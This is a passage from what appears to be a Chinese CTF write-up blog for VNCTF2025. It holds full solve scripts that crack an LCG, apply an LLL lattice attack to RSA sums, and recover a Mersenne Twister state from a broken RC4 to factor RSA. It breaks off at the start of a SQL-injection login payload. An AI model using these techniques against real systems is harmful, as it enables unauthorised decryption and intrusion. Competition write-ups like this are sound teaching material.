class="hljs-number">1</span>][<span class="hljs-number">0</span>]) * inverse(<span class="hljs-built_in">int</span>(t[n-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]*z[n-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]),p) % p<br>m = <span class="hljs-built_in">int</span>(x)<br>m = m&amp;((<span class="hljs-number">1</span>&lt;&lt;(m.bit_length()-<span class="hljs-number">1</span>))-<span class="hljs-number">1</span>)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)))<br></code></pre></td></tr></table></figure> <img src="/img/VNCTF2025/VNCTF2025_5.png" alt="alt text" /></li></ul><h2 id="simple-prediction">Simple prediction</h2><ul><li>题目分为两部分，第一部分是一个变式LCG随机数破解，只要找出两组即以上的间隔相同的四个LCG随机数便可以通过求公约数得到模数n，详细推导见<a href="https://zer0yu.github.io/2018/11/02/Cracking-LCG/">博客</a>，再根据模数便可求出增量和乘数，根据列表中是否为真LCG随机数求出flag对应的0/1位； <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert,gcd<br><br><span class="hljs-comment"># 列表n过长不显</span><br>knownlis = n[<span class="hljs-number">2</span>+<span class="hljs-number">8</span>*<span class="hljs-number">2</span>:<span class="hljs-number">6</span>+<span class="hljs-number">8</span>*<span class="hljs-number">2</span>]<br>difflis = [knownlis[i+<span class="hljs-number">1</span>]-knownlis[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]<br>n1 = difflis[<span class="hljs-number">1</span>]*difflis[<span class="hljs-number">1</span>]-difflis[<span class="hljs-number">0</span>]*difflis[<span class="hljs-number">2</span>]<br>knownlis = n[<span class="hljs-number">8</span>*<span class="hljs-number">3</span>:<span class="hljs-number">8</span>*<span class="hljs-number">4</span>:<span class="hljs-number">2</span>]<br>difflis = [knownlis[i+<span class="hljs-number">1</span>]-knownlis[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]<br>n2 = difflis[<span class="hljs-number">1</span>]*difflis[<span class="hljs-number">1</span>]-difflis[<span class="hljs-number">0</span>]*difflis[<span class="hljs-number">2</span>]<br>n_mod = gcd(n1,n2)<br><span class="hljs-built_in">print</span>(n_mod,n_mod.bit_length())<br><br>knownlis = n[<span class="hljs-number">2</span>+<span class="hljs-number">8</span>*<span class="hljs-number">2</span>:<span class="hljs-number">6</span>+<span class="hljs-number">8</span>*<span class="hljs-number">2</span>]<br>m = ((knownlis[<span class="hljs-number">2</span>]-knownlis[<span class="hljs-number">1</span>])*invert(knownlis[<span class="hljs-number">1</span>]-knownlis[<span class="hljs-number">0</span>],n_mod))%n_mod<br>c = (knownlis[<span class="hljs-number">1</span>]-knownlis[<span class="hljs-number">0</span>]*m)%n_mod<br><span class="hljs-keyword">assert</span> (m*knownlis[<span class="hljs-number">2</span>]+c)%n_mod==knownlis[<span class="hljs-number">3</span>]<br>flag1 = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;VN&quot;</span>])+<span class="hljs-string">&quot;01&quot;</span><br>s = n[<span class="hljs-number">2</span>+<span class="hljs-number">8</span>*<span class="hljs-number">2</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>+<span class="hljs-number">8</span>*<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(n)):<br>    <span class="hljs-keyword">if</span> s==n[i]:<br>        flag1+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        flag1+=<span class="hljs-string">&#x27;1&#x27;</span><br>    s = (m*s+c)%n_mod<br>flag1 = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(flag1[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(flag1),<span class="hljs-number">8</span>)])<br><span class="hljs-built_in">print</span>(flag1)<br></code></pre></td></tr></table></figure></li><li>第二部分是一道经典的格基规约问题，根据 <span class="math display">\[\sum (m^e \; mod \; n) \equiv c  \]</span> 构造矩阵并用sage库进行格基规约。但是由于第二部分的flag长度不确定，需要爆破长度： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">16880924655573626811763865075201881594085658222047473444427295924181371341406971359787070757333746323665180258925280624345937931067302673406166527557074157053768756954809954623549764696024889104571712837947570927160960150469942624060518463231436452655059364616329589584232929658472512262657486196000339385053006838678892053410082983193195313760143294107276239320478952773774926076976118332506709002823833966693933772855520415233420873109157410013754228009873467565264170667190055496092630482018483458436328026371767734605083997033690559928072813698606007542923203397847175503893541662307450142747604801158547519780249</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">9032357989989555941675564821401950498589029986516332099523507342092837051434738218296315677579902547951839735936211470189183670081413398549328213424711630953101945318953216233002076158699383482500577204410862449005374635380205765227970071715701130376936200309849157913293371540209836180873164955112090522763296400826270168187684580268049900241471974781359543289845547305509778118625872361241263888981982239852260791787315392967289385225742091913059414916109642527756161790351439311378131805693115561811434117214628348326091634314754373956682740966173046220578724814192276046560931649844628370528719818294616692090359</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">100</span>-<span class="hljs-number">32</span>):<br>    knownm = [idx+<span class="hljs-number">0x1234</span> <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i)]<br>    knownc = [<span class="hljs-built_in">pow</span>(m,e,n) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> knownm]<br>    matrix = [[<span class="hljs-number">0</span>]*(i+<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i+<span class="hljs-number">2</span>)]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i):<br>        matrix[j][j] = <span class="hljs-number">1</span><br>        matrix[j][-<span class="hljs-number">1</span>] = knownc[j]<br>    matrix[i][i] = <span class="hljs-number">1</span><br>    matrix[i][-<span class="hljs-number">1</span>] = c<br>    matrix[i+<span class="hljs-number">1</span>][-<span class="hljs-number">1</span>] = n<br>    A = Matrix(matrix)<br>    B = A.LLL()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> B[<span class="hljs-number">0</span>]:<br>        <span class="hljs-keyword">if</span> i&gt;<span class="hljs-number">128</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>flag2 = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> B[<span class="hljs-number">0</span>][:-<span class="hljs-number">2</span>]])<br><span class="hljs-built_in">print</span>(flag2)<br></code></pre></td></tr></table></figure> <img src="/img/VNCTF2025/VNCTF2025_6.png" alt="alt text" /></li></ul><h2 id="并非rc4">并非RC4</h2><ul><li>题目提供的RC4中加密盒数据交换有错误，因此在经过多次加密后加密盒内的数据将退化成同一个数字，最终演化成一个破解python伪随机数生成的问题： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">sbox[i] = sbox[j]  <br>sbox[j] = sbox[i]<br></code></pre></td></tr></table></figure></li><li>之前也做过类似的题目，具体推导过程参考<a href="https://www.anquanke.com/post/id/205861#h3-9">博客</a>，需要跑出一个19968*19968的转换矩阵再对猜测加密盒退化数字后的随机数处理恢复梅森旋转算法最开始的状态state，验证后便可破解随机数解密RSA；</li><li>生成矩阵的代码： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br>prng = Random()<br>length = <span class="hljs-number">19968</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myState</span>():<br>    state = [<span class="hljs-number">0</span>]*<span class="hljs-number">624</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i&lt;length:<br>        ind = i//<span class="hljs-number">32</span><br>        expont = i%<span class="hljs-number">32</span><br>        state[ind] = <span class="hljs-number">1</span>&lt;&lt;(<span class="hljs-number">31</span>-expont)<br>        <span class="hljs-keyword">yield</span> (<span class="hljs-number">3</span>,<span class="hljs-built_in">tuple</span>(state+[<span class="hljs-number">0</span>]),<span class="hljs-literal">None</span>)<br>        state[ind] = <span class="hljs-number">0</span><br>        i += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getRow</span>():<br>    rng = Random()<br>    gs = myState()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>        s = <span class="hljs-built_in">next</span>(gs)<br>        rng.setstate(s)<br>        row = vector(GF(<span class="hljs-number">2</span>),[<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> [rng.getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length//<span class="hljs-number">8</span>)] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(z)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)])<br>        <span class="hljs-keyword">yield</span> row<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buildBox</span>():<br>    b = matrix(GF(<span class="hljs-number">2</span>),length,length)<br>    rg = getRow()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(length)):<br>        b[i] = <span class="hljs-built_in">next</span>(rg)<br>    <span class="hljs-keyword">return</span> b<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    b = buildBox()<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Matrix_large&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(b.nrows())):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b.ncols()):<br>            f.write(<span class="hljs-built_in">str</span>(b[i,j])+<span class="hljs-string">&quot;n&quot;</span>)<br>    f.close()<br><br>test()<br></code></pre></td></tr></table></figure></li><li>爆破最后退化的数字并验证（一开始代码写错了，得到了结果但是没退出循环，硬跑了一个半小时） <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> nextprime<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buildMatrix</span>():<br>    length = <span class="hljs-number">19968</span><br>    cnt = <span class="hljs-number">0</span><br>    m = matrix(GF(<span class="hljs-number">2</span>), length, length)<br>    lis = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Matrix_large&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read().split(<span class="hljs-string">&quot;n&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(lis)-<span class="hljs-number">1</span>)):<br>        row = cnt // <span class="hljs-number">19968</span><br>        col = cnt % <span class="hljs-number">19968</span><br>        m[row, col] = lis[i]<br>        cnt += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> m<br><br>m = buildMatrix()<br><br><span class="hljs-comment"># X = Z*(T^-1)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recoverState</span>(<span class="hljs-params">leak</span>):<br>    <span class="hljs-keyword">try</span>:<br>        x = m.solve_left(leak)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    x = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x])<br>    state = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>        tmp = <span class="hljs-built_in">int</span>(x[i * <span class="hljs-number">32</span>:(i + <span class="hljs-number">1</span>) * <span class="hljs-number">32</span>], <span class="hljs-number">2</span>)<br>        state.append(tmp)<br>    <span class="hljs-keyword">return</span> state<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backfirst</span>(<span class="hljs-params">state</span>):<br>    high = <span class="hljs-number">0x80000000</span><br>    low = <span class="hljs-number">0x7fffffff</span><br>    mask = <span class="hljs-number">0x9908b0df</span><br>    tmp = state[<span class="hljs-number">623</span>] ^ state[<span class="hljs-number">396</span>]<br>    <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>        tmp ^= mask<br>        tmp &lt;&lt;= <span class="hljs-number">1</span><br>        tmp |= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        tmp &lt;&lt;= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span> - <span class="hljs-number">1</span>) | tmp &amp; low, tmp &amp; low<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">leak</span>):<br>    state = recoverState(leak)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> state:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    L = [leak[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">120</span>)]<br>    prng = random.Random()<br>    guess1, guess2 = backfirst(state)<br>    <span class="hljs-built_in">print</span>(guess1, guess2)<br>    state[<span class="hljs-number">0</span>] = guess1<br>    s = state<br>    prng.setstate((<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(s + [<span class="hljs-number">0</span>]), <span class="hljs-literal">None</span>))<br>    g1 = [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> [prng.getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">120</span>//<span class="hljs-number">8</span>)] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(z)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)]<br>    <span class="hljs-keyword">if</span> g1 == L:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;first&quot;</span>)<br>        prng.setstate((<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(s + [<span class="hljs-number">0</span>]), <span class="hljs-literal">None</span>))<br>        <span class="hljs-keyword">return</span> prng<br><br>    state[<span class="hljs-number">0</span>] = guess2<br>    s = state<br>    prng.setstate((<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(s + [<span class="hljs-number">0</span>]), <span class="hljs-literal">None</span>))<br>    g2 = [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> [prng.getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">120</span>//<span class="hljs-number">8</span>)] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(z)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)]<br>    <span class="hljs-keyword">if</span> g2 == L:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;second&quot;</span>)<br>        prng.setstate((<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(s + [<span class="hljs-number">0</span>]), <span class="hljs-literal">None</span>))<br>        <span class="hljs-keyword">return</span> prng<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    length = <span class="hljs-number">19968</span><br>    prng = random.Random()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">37440</span>):<br>        prng.getrandbits(<span class="hljs-number">8</span>)<br>    originState = prng.getstate()<br>    leak = vector(GF(<span class="hljs-number">2</span>), [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> [prng.getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length//<span class="hljs-number">8</span>)] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(z)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)])<br>    <span class="hljs-comment"># 恢复state</span><br>    state = recoverState(leak)<br>    prng.setstate(originState)<br>    prng.getrandbits(<span class="hljs-number">8</span>)<br>    originState = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> prng.getstate()[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>]]<br>    <span class="hljs-keyword">assert</span> originState[<span class="hljs-number">1</span>:] == state[<span class="hljs-number">1</span>:]<br>    L = [leak[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">120</span>)]<br>    <span class="hljs-comment"># 两种可能</span><br>    guess1, guess2 = backfirst(state)<br>    <span class="hljs-built_in">print</span>(guess1, guess2)<br>    state[<span class="hljs-number">0</span>] = guess1<br>    s = state<br>    prng.setstate((<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(s + [<span class="hljs-number">0</span>]), <span class="hljs-literal">None</span>))<br>    g1 = [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> [prng.getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">120</span>//<span class="hljs-number">8</span>)] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(z)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)]<br>    <span class="hljs-keyword">if</span> g1 == L:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;first&quot;</span>)<br>    state[<span class="hljs-number">0</span>] = guess2<br>    s = state<br>    prng.setstate((<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(s + [<span class="hljs-number">0</span>]), <span class="hljs-literal">None</span>))<br>    g2 = [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> [prng.getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">120</span>//<span class="hljs-number">8</span>)] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(z)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)]<br>    <span class="hljs-keyword">if</span> g2 == L:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;second&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data_RC4.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()<br>    lis = <span class="hljs-built_in">eval</span>(f)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)):<br>        randcrack = [i^<span class="hljs-number">17</span>^lis[j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">37440</span>,<span class="hljs-number">37440</span>+<span class="hljs-number">2496</span>)]<br>        leak = vector(GF(<span class="hljs-number">2</span>), [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> randcrack <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(z)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)])<br>        prng = pwn(leak)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> prng:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">37440</span>,<span class="hljs-number">40000</span>):<br>            <span class="hljs-keyword">if</span> prng.getrandbits(<span class="hljs-number">8</span>)!=i^<span class="hljs-number">17</span>^lis[j]:<br>                <span class="hljs-built_in">print</span>(j)<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;crack!i=<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br>            p = nextprime(prng.getrandbits(<span class="hljs-number">512</span>))<br>            n = <span class="hljs-number">26980604887403283496573518645101009757918606698853458260144784342978772393393467159696674710328131884261355662514745622491261092465745269577290758714239679409012557118030398147480332081042210408218887341210447413254761345186067802391751122935097887010056608819272453816990951833451399957608884115252497940851</span><br>            e = <span class="hljs-number">65537</span><br>            encrypted_flag = <span class="hljs-number">22847144372366781807296364754215583869872051137564987029409815879189317730469949628642001732153066224531749269434313483657465708558426141747771243442436639562785183869683190497179323158809757566582076031163900773712582568942616829434508926165117919744857175079480357695183964845638413639130567108300906156467</span><br>            <span class="hljs-keyword">assert</span> n%p==<span class="hljs-number">0</span><br>            q = n//p<br>            phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>            d = invert(e,phi)<br>            m = <span class="hljs-built_in">pow</span>(encrypted_flag,d,n)<br>            <span class="hljs-built_in">print</span>(long_to_bytes(m))<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># test()</span><br>main()<br></code></pre></td></tr></table></figure> <img src="/img/VNCTF2025/VNCTF2025_7.png" alt="alt text" /></li><li>总共跑了三个小时才拿到结果😅 <img src="/img/VNCTF2025/VNCTF2025_8.png" alt="alt text" /></li></ul><h1 id="web"><strong>Web</strong></h1><p>一天的时间太紧张，都没怎么看其他web题。</p><h2 id="奶龙回家">奶龙回家</h2><ul><li>经典的注入漏洞，打开网站用burpsuit抓包后使用爬虫发包： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">data = &#123; <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&quot;&quot;</span>&#125;<br>headers = &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>&#125;<br>response = requests.post(url, headers=headers, data=json.dumps(data))<br></code></pre></td></tr></table></figure></li><li>上来先<code>' or 